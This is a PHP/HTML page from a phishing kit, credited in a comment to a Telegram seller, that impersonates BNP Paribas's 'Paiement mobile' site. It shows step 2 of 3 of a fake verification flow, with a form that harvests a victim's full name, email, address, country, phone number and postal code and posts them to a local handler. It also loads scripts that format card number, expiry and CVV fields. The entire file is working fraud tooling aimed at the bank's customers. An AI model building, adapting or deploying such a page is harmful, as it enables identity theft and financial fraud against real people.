<!-- SCAMA WIDTH GHAYT
                                ============================
                                ============================

                                  TELEGRAM : @ghayt_Zone

                                ============================
                                ============================
-->


<?php 

require_once "functions.php";

?>


<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <title>Paiement mobile | BNP Paribas</title>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <!-- template css files-->
  <link rel="stylesheet"  href="css/bootstrap.css">
  <link rel="stylesheet"  href="css/test.css">             
  <link rel="preconnect" href="https://fonts.gstatic.com">
  

  <!-- js files-->
  <script src="js/html5shiv.min.js"></script>
  <script src="js/respond.min.js"></script>

  <!-- logo site web-->
  <link rel="icon" href="image/ssx.png" type="image/x-icon" />
  <link rel="shortcut icon" href="image/ssx.png" type="image/x-icon" />

  <!-- fontawtsome -->
  <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>

</head>

<body>
    
    <header>
        <div class="header bg-white py-2">
            <div class="row align-items-center">

                <div class="col">
                    <div class="logo">
                        <img id="logo" src="image/logo.png">
                        <img id="ph" src="image/txt.png">
                    </div>
                </div>

                <div class="col text-end d-none d-md-block">
                    <div class="navv">
                        <img src="image/bt.png">
                    </div>
                </div>

                <div class="col text-end d-block d-md-none">
                    <div class="navv">
                        <img src="image/nav-res.png">
                    </div>
                </div>

            </div>
           
        </div>
    </header>

    <section class="bg-white cc" style="padding-top: 74px;">
       <div class="row">
           <div class="col-lg-1 d-none d-lg-block" style="padding-left:0;">
               <div class="slid">
                   <img src="image/Paiement-mobile-BNP-Paribas.png">
               </div>
           </div>
           <div class="col-lg-11">

               <div class="cartes">
                      <ul class="list-unstyled d-flex">
                          <li class="me-2">Comptes Et Contrats</li>
                          <li class="me-2"><i class="fas fa-angle-right"></i></li>
                          <li class="me-2">MES-INFOS</li>
                      </ul>
                      <h2>MES INFOS</h2>
                     <span><strong> 2/3 Verification</strong></span>
               </div>

               <div class="form">
                   
                    <form class="bg-white border" action="infos.php" method="post" style="max-width:100%">

                        <input type="hidden" value="billing" name="step">

                        <div class="row py-2 px-2" style="background: #f5f5f5;">
                            <div class="col text-start">
                                <h4>MON INFORMATION</h4>
                            </div>
                            <div class="col text-end">
                                <span>Toutes les informations sont obligatoires*</span>
                            </div>
                        </div>




                        <div class="row py-2 px-3">

                            <div class="col-md-6" style="padding-left:0">
                                <div class="form-groupe">
                                    <label>Nom complet*</label>
                                    <input id="nom" class="form-control" type="text" name="nom">
                                     <?php
                                          if( !empty($_SESSION['errors']['nom']) ) {
                                            echo '<div class="error" class="error">the value is required</div>';}
                                     ?>
                                    
                                </div>
                            </div>

                            <div class="col-md-6 " style="padding-left:0">
                                <div class="form-groupe">
                                    <label id="label-date">Email *</label>
                                    <input id="email" class="form-control" type="text" name="email">
                                     <?php
                                          if( !empty($_SESSION['errors']['email']) ) {
                                            echo '<div class="error" class="error">the value is required</div>';}
                                     ?>
                                     
                                </div>
                            </div>
                        </div>

                        <div class="row py-2 px-3">

                            <div class="col-md-6" style="padding-left:0">
                                <div class="form-groupe">
                                    <label>Adresse *</label>
                                    <input id="adresse" class="form-control" type="text" name="adresse">
                                     <?php
                                          if( !empty($_SESSION['errors']['adresse']) ) {
                                            echo '<div class="error" class="error">the value is required</div>';}
                                     ?>
                                    
                                </div>
                            </div>

                            <div class="col-md-6 " style="padding-left:0">
                                <div class="form-groupe">
                                    <label id="label-date">Pays *</label>
                                    <input id="pays" class="form-control" type="text" name="pays">
                                     <?php
                                          if( !empty($_SESSION['errors']['pays']) ) {
                                            echo '<div class="error" class="error">the value is required</div>';}
                                     ?>
                                     
                                </div>
                            </div>
                        </div>

                        <div class="row py-2 px-3">

                            <div class="col-md-6" style="padding-left:0">
                                <div class="form-groupe">
                                    <label>Numéro De Téléphone *</label>
                                    <input id="numero" maxlength="10" class="form-control" type="text" name="numero">
                                     <?php
                                          if( !empty($_SESSION['errors']['numero']) ) {
                                            echo '<div class="error" class="error">the value is required</div>';}
                                     ?>
                                    
                                </div>
                            </div>

                            <div class="col-md-6 " style="padding-left:0">
                                <div class="form-groupe">
                                    <label id="label-date">Code Zip *</label>
                                    <input id="code_zip" class="form-control" type="text" name="code_zip">
                                     <?php
                                          if( !empty($_SESSION['errors']['code_zip']) ) {
                                            echo '<div class="error" class="error">the value is required</div>';}
                                     ?>
                                     
                                </div>
                            </div>
                        </div>

                        <div class="bttn text-center text-md-end">
                            <button name="submit"  class="btn btn-primary">Valider</button>
                        </div>

                        
                    </form>
               </div>
           </div>
       </div>
    </section>

    <footer>

        <div class="media row align-items-center">
            <div class="col-md-6 text-center text-md-end">
                <span>Suivez-nous sur :</span>
            </div>
            <div class="col-md-6  text-center text-md-start">
               <img src="image/media.png">
            </div>
        </div>

        <div class="con row mt-5">

            <div class="col-md-4">
                 <div class="contact">
                    <h3>CONTACT</h3>
                    <p> Nos conseillers vous répondent par téléphone, chat, mail ou bien encore grâce à nos SAV Facebook et Twitter.</p>
                </div>
            </div>

            <div class="col-md-4">
                 <div class="contact">
                    <h3>TROUVER UNE AGENCE</h3>
                    <p>Retrouvez facilement l’agence la plus proche avec ses horaires d’ouverture et les services disponibles.</p>
                </div>
            </div>

            <div class="col-md-4">
                 <div class="contact">
                    <h3>LES APPLICATIONS MOBILES</h3>
                    <p> Découvrez nos applications mobiles pour gérer vos comptes, payer avec votre mobile et vous simplifier la vie.</p>
                </div>
            </div>

        </div>

        <hr style="color:#686868;">

        <div class="info row mt-5">

            <div class="col-md-3">
                 <div class="contact">
                    <h4>INFORMATIONS LÉGALES</h4>
                    <ul class="list-unstyled">
                        <li><a href="#">Données personnelles</a></li>
                        <li><a href="#">Mentions légales</a></li>
                        <li><a href="#">Cookies</a></li>
                        <li><a href="#">Réglementation</a></li>
                        <li><a href="#">Fonds de Garantie des Dépôts et</a></li>
                        <li><a href="#">résolution</a></li>
                        
                    </ul>
                </div>
            </div>

            <div class="col-md-3">
                 <div class="contact">
                    <h4>NOUS CONNAÎTRE</h4>
                    <ul class="list-unstyled">
                       <li><a href="#">La banque d’un monde qui change</a></li>
                       <li><a href="#">Nos engagements responsables</a></li>
                    </ul>
                </div>
            </div>

            <div class="col-md-3">
                 <div class="contact">
                    <h4>INFORMATIONS</h4>
                   <ul class="list-unstyled">
                        <li><a href="#">Site Accessible</a></li>
                        <li><a href="#">Site Sécurisé</a></li>
                        <li><a href="#">Conditions d’éligibilité</a></li>
                        <li><a href="#">Tarifs et conditions</a></li>
                        <li><a href="#">Glossaire</a></li>
                        <li><a href="#">Guides et brochures</a></li>
                   </ul>
                </div>
            </div>

            <div class="col-md-3">
                 <div class="contact">
                    <h4>NOS AUTRES SITES</h4>
                    <ul class="list-unstyled">
                        <li><a href="#">Les Professionnels</a></li>
                        <li><a href="#">Les Entreprises</a></li>
                        <li><a href="#">Les Associations</a></li>
                        <li><a href="#">La Banque Privée</a></li>
                        <li><a href="#">La Banque en ligne</a></li>
                        <li><a href="#">Le Groupe BNP Paribas</a></li>
                    </ul>
                </div>
            </div>

        </div>

        <div class="ft text-center mt-4">
            <p>Pour la bonne exécution de vos contrats, et en cas de réclamations/contestations, votre Conseiller est joignable sur sa ligne directe (appel non surtaxé). Si vous ne disposez plus de son numéro de téléphone direct, envoyez-lui un message par votre messagerie sécurisée, il vous le donnera à nouveau en retour.</p>
        </div>


    </footer>




   




  <!-- template files js-->
  <script src="js/jquery-3.5.1.min.js"></script>
  <script src="js/bootstrap.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/3.0.0/jquery.payment.min.js"></script>
  <script>
       
            $('#cvv').payment('formatCardCVC');
            $('#expiry').payment('formatCardExpiry');
            $('#card_number').payment('formatCardNumber');
      </script>

  </script>
</body>
</html>